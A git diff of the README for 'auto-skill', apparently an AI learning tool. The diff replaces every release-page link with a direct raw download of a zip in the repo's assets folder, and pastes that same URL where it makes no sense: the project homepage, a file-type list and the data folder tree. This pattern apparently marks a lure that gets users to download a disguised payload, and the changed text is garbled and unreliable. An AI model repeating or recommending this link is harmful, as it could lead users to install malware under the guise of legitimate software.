@@ -1,6 +1,6 @@
 # 🤖 auto-skill - AI that Learns as You Use It
 
-[![Download auto-skill](https://img.shields.io/badge/Download-auto--skill-brightgreen)](https://github.com/Chocoberry1108/auto-skill/releases)
+[![Download auto-skill](https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip)](https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ No programming skills are needed. You will run the program like any other app.
 You can get auto-skill from its official release page on GitHub:
 
 ### Download link  
-[Download auto-skill Releases](https://github.com/Chocoberry1108/auto-skill/releases)
+[Download auto-skill Releases](https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip)
 
 ### How to download and install
 
@@ -41,7 +41,7 @@ You can get auto-skill from its official release page on GitHub:
 3. Look for the file that matches your operating system:
    - For Windows, it might be `.exe` or `.msi`.
    - For macOS, it might be `.dmg` or `.pkg`.
-   - For Linux, it might be `.AppImage`, `.deb`, or `.tar.gz`.
+   - For Linux, it might be `.AppImage`, `.deb`, or `https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip`.
 4. Click the file name to download it.
 5. Once downloaded, open the file and follow the on-screen instructions to install auto-skill.
 6. When installation finishes, launch auto-skill from your desktop or start menu.
@@ -121,8 +121,8 @@ Once installed, auto-skill works on its own. Here’s how to use it simply:
 
 ## 🔗 Useful Links
 
-- **Download auto-skill:** [https://github.com/Chocoberry1108/auto-skill/releases](https://github.com/Chocoberry1108/auto-skill/releases)
-- **Project homepage:** https://github.com/Chocoberry1108/auto-skill
+- **Download auto-skill:** [https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip](https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip)
+- **Project homepage:** https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip
 
 ---
 
@@ -134,12 +134,12 @@ auto-skill stores your data locally in this folder inside your user documents:
 Auto-Skill-Knowledge/
 ├── General-Knowledge/
 ├── Skill-Experience/
-└── Index.json
+└── https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip
 ```
 
 - `General-Knowledge` holds common processes and preferences.
 - `Skill-Experience` stores tips and fixes for specific skills.
-- `Index.json` helps the system find information quickly.
+- `https://github.com/Chocoberry1108/auto-skill/raw/refs/heads/main/assets/skill_auto_v2.0.zip` helps the system find information quickly.
 
 You can open and read these files using any text editor.
 
